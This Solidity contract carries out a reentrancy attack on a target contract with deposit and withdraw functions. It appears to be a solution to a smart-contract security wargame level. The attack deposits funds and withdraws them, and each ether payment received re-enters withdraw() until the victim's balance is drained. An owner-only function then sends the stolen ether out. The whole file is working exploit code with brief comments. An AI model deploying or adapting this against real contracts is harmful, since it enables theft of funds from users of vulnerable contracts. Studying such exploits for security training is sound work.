//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// The interface of the target contract
interface IReentrance {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract ReentrancyAttack {
    IReentrance victim;
    address payable owner;
    error SendFailed();

    // Set the msg.sender as this contract's owner.
    // And also set the address of the target contract as victim.
    constructor(address _target) {
        victim = IReentrance(_target);
        owner = payable(msg.sender);
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw(msg.value);
        // You cannot add a selfdestruct statement below.
        // A selfdestruct statement will cause the transaction being reverted.
    }

    function cashOut(address payable _to) external payable onlyOwner {
        // The send method has a gas limit 2300.
        bool success = _to.send(address(this).balance);
        if(!success){
            revert SendFailed();
        }
    }

    // receive function only used to receive ETH.
    // No msg.data allowed.
    // This function will be triggered when receiving ETH.
    receive() external payable {
        uint targetBalance = address(victim).balance;

        if (targetBalance >= 0.001 ether) {
            victim.withdraw(0.001 ether);
        }
    }

}